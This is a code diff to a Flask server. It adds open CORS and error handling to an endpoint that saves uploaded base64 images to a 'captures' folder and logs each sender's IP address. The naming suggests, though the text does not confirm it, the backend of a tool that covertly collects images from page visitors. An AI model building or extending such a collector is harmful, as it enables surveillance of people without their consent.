@@ -1,8 +1,10 @@
 from flask import Flask, request, send_from_directory, jsonify
 import os, base64
 from datetime import datetime
+from flask_cors import CORS
 
 app = Flask(__name__, static_folder="frontend")
+CORS(app)  # Enable CORS for all routes
 
 CAPTURE_DIR = "captures"
 LOG_FILE = "logs.txt"
@@ -23,24 +25,45 @@ def admin():
 
 @app.route("/upload", methods=["POST"])
 def upload():
-    data = request.json.get("image")
-    if not data:
-        return {"status": "error"}
+    try:
+        # Get JSON data
+        json_data = request.get_json()
+        if not json_data:
+            return {"status": "error", "message": "No JSON data"}, 400
+        
+        data = json_data.get("image")
+        if not data:
+            return {"status": "error", "message": "No image data"}, 400
 
-    ip = request.remote_addr
+        # Validate base64 data format
+        if "," not in data:
+            return {"status": "error", "message": "Invalid image format"}, 400
 
-    header, encoded = data.split(",", 1)
-    img_data = base64.b64decode(encoded)
+        ip = request.remote_addr
+        
+        try:
+            header, encoded = data.split(",", 1)
+            img_data = base64.b64decode(encoded)
+        except Exception as e:
+            return {"status": "error", "message": f"Base64 decode failed: {str(e)}"}, 400
 
-    filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
-    path = os.path.join(CAPTURE_DIR, filename)
+        if not img_data or len(img_data) < 100:
+            return {"status": "error", "message": "Image data too small"}, 400
 
-    with open(path, "wb") as f:
-        f.write(img_data)
+        filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
+        path = os.path.join(CAPTURE_DIR, filename)
 
-    log_ip(ip, filename)
+        with open(path, "wb") as f:
+            f.write(img_data)
 
-    return {"status": "saved"}
+        log_ip(ip, filename)
+        print(f"[SUCCESS] Captured: {filename} from {ip}")
+
+        return {"status": "saved", "filename": filename}, 200
+    
+    except Exception as e:
+        print(f"[ERROR] Upload failed: {str(e)}")
+        return {"status": "error", "message": str(e)}, 500
 
 @app.route("/captures/<file>")
 def get_file(file):
